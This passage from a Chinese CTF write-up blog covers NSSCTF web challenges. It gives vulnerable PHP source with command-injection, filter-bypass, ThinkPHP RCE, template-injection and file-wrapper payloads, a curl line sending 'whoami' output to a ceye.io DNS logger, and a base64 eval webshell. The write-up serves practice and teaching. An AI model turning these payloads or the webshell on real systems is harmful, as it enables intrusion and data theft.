(&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;w1reshARK_ez_1sntit&#125;~~~~&lt;</span></span><br></pre></td></tr></table></figure><h4 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>PHP_SELF是取 payload的后面部分，也就是/后面的</p><p>下划线可以用[代替</p><p><code>index.php/utils.php/%89?show[source=1</code></p><p>%88为非ascll字符，为什么要用不可见字符？如果把%88换成a，$_SERVER[‘PHP_SELF’]会读取到utils.php/a，basename函数就会只读取a并返回a，highlight_file就会显示a这个文件的源代码，这-明显是错误的。如果basename函数在读取到非ascll的字符时，就会停止读取路径了，就会返回utils.php，就可以达到我们想要的结果。然而basename遇到非ascii码会舍弃</p><p>index.php/utils.php/%89?show[source=1</p><h4 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$aaa</span> = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, <span class="variable">$aaa</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;admin&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$level_3</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$level_3</span>-&gt;result == <span class="variable">$result</span>) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  here is level <span class="number">2</span>here is level <span class="number">3</span>,<span class="keyword">do</span> you kown how to overcome it?success:NSSCTF&#123;<span class="number">1</span>cf861d8-a8f0-<span class="number">4</span>ed0-<span class="number">92e8</span>-<span class="number">2</span>c251e4b34a6&#125;</span><br><span class="line">第一用换行符绕过</span><br><span class="line">http:<span class="comment">//node4.anna.nssctf.cn:28689/?aaa=%0apass_the_level_1%23</span></span><br><span class="line">admin[]=<span class="number">1</span>&amp;root_pwd[]=a&amp;level_3=&#123;<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;result&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="MoeCTF-2021-babyRCE"><a href="#MoeCTF-2021-babyRCE" class="headerlink" title="[MoeCTF 2021]babyRCE"></a>[MoeCTF 2021]babyRCE</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>http://node2.anna.nssctf.cn:28603/?rce=grep$&#123;IFS&#125;f$&#123;IFS&#125;fla?.php</code></p><p><code>http://node2.anna.nssctf.cn:28603/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p><p>用这个空格<code>$&#123;IFS&#125;</code> 其他好像不行</p><h4 id="LitCTF-2023-作业管理系统"><a href="#LitCTF-2023-作业管理系统" class="headerlink" title="[LitCTF 2023]作业管理系统"></a>[LitCTF 2023]作业管理系统</h4><p>看了一下是探姬师傅出的题，以为很难，其实没那么难，开局看到源代码有默认口令，admin/admin</p><p>登录上去，直接这里上传文件就行了，</p><p><img src="/images/others/image-20230616170455923.png" alt="image-20230616170455923"></p><p>会上传到./下，也就是当前目录，也就是直接访问就行了。</p><p><img src="/images/others/image-20230616170646937.png" alt="image-20230616170646937"></p><h4 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h4><p>command=127.0.0.1;cat /flag&amp;ping=Ping</p><p><img src="/images/others/image-20230616171115155.png" alt="image-20230616171115155"></p><h4 id="LitCTF-2023-Vim-yyds"><a href="#LitCTF-2023-Vim-yyds" class="headerlink" title="[LitCTF 2023]Vim yyds"></a>[LitCTF 2023]Vim yyds</h4><p>在vim 编辑错误的时候，会产生<code>.index.php.swp</code>文件，所以直接下载``<a href="http://node2.anna.nssctf.cn:28510/.index.php.swp%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%A5%BD%E5%90%8E%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%E4%BC%9A%E4%B9%B1%E7%A0%81%EF%BC%8C%E9%9A%8F%E4%BE%BF%E6%8B%96%E4%B8%AAlinux%E4%B8%8A%EF%BC%8C%E7%84%B6%E5%90%8E">http://node2.anna.nssctf.cn:28510/.index.php.swp，下载好后，直接打开会乱码，随便拖个linux上，然后</a> vim -r 文件，即可看到源码</p><p><img src="/images/others/image-20230616171611477.png" alt="image-20230616171611477"></p><p><img src="/images/others/image-20230616171949147.png" alt="image-20230616171949147"></p><h4 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &#x27;eyJuYW1lIjoiMTIzMTIzIn0.ZJBfaw.eXjErywCjj_0-tZe0l8-X_jc6hA&#x27; -s &#x27;LitCTF&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;123123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿bohemian)-[/tools/flask-session-cookie-manager]</span><br><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &#x27;eyJuYW1lIjoiMTIzMTIzMTIzIn0.ZJBf2g.6hBTi7wSIWzWnWHr8F4P9t4CItw&#x27; -s &#x27;LitCTF&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;123123123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">┌──(root㉿bohemian)-[/tools/flask-session-cookie-manager]</span><br><span class="line">└─<span class="comment"># python3 flask_session_cookie_manager3.py encode -s &#x27;LitCTF&#x27; -t &quot;&#123;&#x27;name&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJuYW1lIjoiYWRtaW4ifQ.ZJBgMQ.JTcEaSlnwJUiq70P847ooZJe0T4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230619220547444.png" alt="image-20230619220547444"></p><h4 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h4><p>猜的</p><p><img src="/images/others/image-20230619222453209.png" alt="image-20230619222453209"></p><h4 id="LitCTF-2023-Http-pro-max-plus已解决"><a href="#LitCTF-2023-Http-pro-max-plus已解决" class="headerlink" title="LitCTF 2023]Http pro max plus已解决"></a>LitCTF 2023]Http pro max plus已解决</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Remote-Addr: 127.0.0.1</span><br><span class="line">X-Real-Ip: 127.0.0.1</span><br><span class="line">REMOTE-HOST: 127.0.0.1</span><br><span class="line">via:127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1 </span><br><span class="line"></span><br><span class="line"> var list_of_fake_ip_headers = [&quot;X-Forwarded-For&quot;,&quot;X-Forwarded&quot;,&quot;Forwarded-For&quot;,&quot;Forwarded&quot;,&quot;X-Forwarded-Host&quot;,&quot;X-remote-IP&quot;,&quot;X-remote-addr&quot;,&quot;True-Client-IP&quot;,&quot;X-Client-IP&quot;,&quot;Client-IP&quot;,&quot;X-Real-IP&quot;,&quot;Ali-CDN-Real-IP&quot;,&quot;Cdn-Src-Ip&quot;,&quot;Cdn-Real-Ip&quot;,&quot;CF-Connecting-IP&quot;,&quot;X-Cluster-Client-IP&quot;,&quot;WL-Proxy-Client-IP&quot;,&quot;Proxy-Client-IP&quot;,&quot;Fastly-Client-Ip&quot;,&quot;True-Client-Ip&quot;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230619223522170.png" alt="image-20230619223522170"></p><p>NSSCTF{50e3aa21-3d2f-4b28-9670-ac2590b70250}</p><h4 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h4><p>改成put就可以了</p><h4 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h4><pre><code>&lt;title&gt;BadBadBooooy&lt;/title&gt;</code></pre><p>php smart</p><p><code>data=&#123;if system(&#39;cat /flag_13_searchmaster&#39;)&#125;&#123;/if&#125;</code></p><p><img src="/images/others/image-20230619225227860.png" alt="image-20230619225227860"></p><h4 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无回显rce ,exec无回显 </p><p>dns外带，但是好像 今天<a href="http://ceye.io/%E4%B8%8D%E8%83%BD%E7%94%A8%E4%BA%86%EF%BC%8C">http://ceye.io/不能用了，</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=1;curl `whoami`.*****s.ceye.io/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?url=l&#x27;&#x27;s / | tee 1.txt</span><br><span class="line">访问http://node2.anna.nssctf.cn:28030/1.txt</span><br><span class="line">?url=ca&#x27;&#x27;t /flllll\aaaaaaggggggg | tee 2.txt</span><br><span class="line">?url=ca&#x27;&#x27;t /flllll&#x27;&#x27;aaaaaaggggggg | tee 2.txt</span><br><span class="line">访问http://node2.anna.nssctf.cn:28030/2.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h4><p>很简单的题，访问网站，跳到了apache2的使用页面，访问index.php,跳到页面，弹窗提示，<code>eval cmd post</code> 那么就直接cmd=phpinfo();,翻了一圈没找到flag，发现有个bbbbbb.txt ,直接用厨子解下</p><p>有个图片，就出flag了。</p><p><img src="/images/others/image-20230630155457254.png" alt="image-20230630155457254"></p><h4 id="SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h4><p>直接php伪协议读取hint.php</p><p><code>http://node2.anna.nssctf.cn:28419/index.php?wllm=php://filter/convert.base64-encode/resource=hint.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接读即可<code>http://node2.anna.nssctf.cn:28419/test2222222222222.php?a=data://text/plain,I want flag</code></p><h4 id="SWPUCTF-2022-新生赛-ez-rce"><a href="#SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_rce"></a>[SWPUCTF 2022 新生赛]ez_rce</h4><p>echo “PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+” | base64 -d &gt; s.php</p><p>PD9waHAgQGV2YWwoJF9QT1NUWydnJ10pOz8+</p><p><a href="http://node1.anna.nssctf.cn:28306/NSS/in1dex.php?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=">http://node1.anna.nssctf.cn:28306/NSS/in1dex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=</a></p><h4 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>=&gt;<span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>=&gt;<span class="literal">true</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$serialized_data</span> = serialize(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span> ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">?info=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><h4 id="UUCTF-2022-新生赛-ez-rce已解决"><a href="#UUCTF-2022-新生赛-ez-rce已解决" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce已解决"></a>[UUCTF 2022 新生赛]ez_rce已解决</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28921/?code=?&gt;&lt;?=`nl /fffffffffflagafag`;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfmisc刷题记录</title>
      <link href="/2023/06/14/ctfmisc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/14/ctfmisc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届ParlooCTF应急响应挑战赛部分wp</title>
      <link href="/2023/05/17/%E7%AC%AC%E4%BA%8C%E5%B1%8AParlooCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/05/17/%E7%AC%AC%E4%BA%8C%E5%B1%8AParlooCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
